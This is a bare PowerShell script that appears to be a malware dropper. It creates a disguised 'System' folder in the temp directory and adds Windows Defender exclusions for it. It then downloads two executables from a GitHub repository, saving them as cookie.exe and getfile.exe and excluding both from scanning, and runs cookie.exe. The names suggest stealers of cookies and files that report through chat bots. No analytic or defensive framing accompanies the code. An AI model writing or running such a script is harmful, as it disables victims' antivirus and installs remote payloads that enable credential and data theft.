$systemPath = [System.IO.Path]::Combine($env:temp, "System")
New-Item -Path $systemPath -ItemType Directory -Force


Add-MpPreference -ExclusionPath $systemPath

$cookieUrl = "https://github.com/minhdmkk6/bot1/raw/refs/heads/main/bot-tele.txt"
$cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")

Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath

Add-MpPreference -ExclusionProcess $cookiePath

$getfileUrl = "https://github.com/minhdmkk6/bot1/raw/refs/heads/main/bot-dis.txt"
$getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")

Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath


Add-MpPreference -ExclusionProcess $getfilePath
Start-Process -FilePath $cookiePath
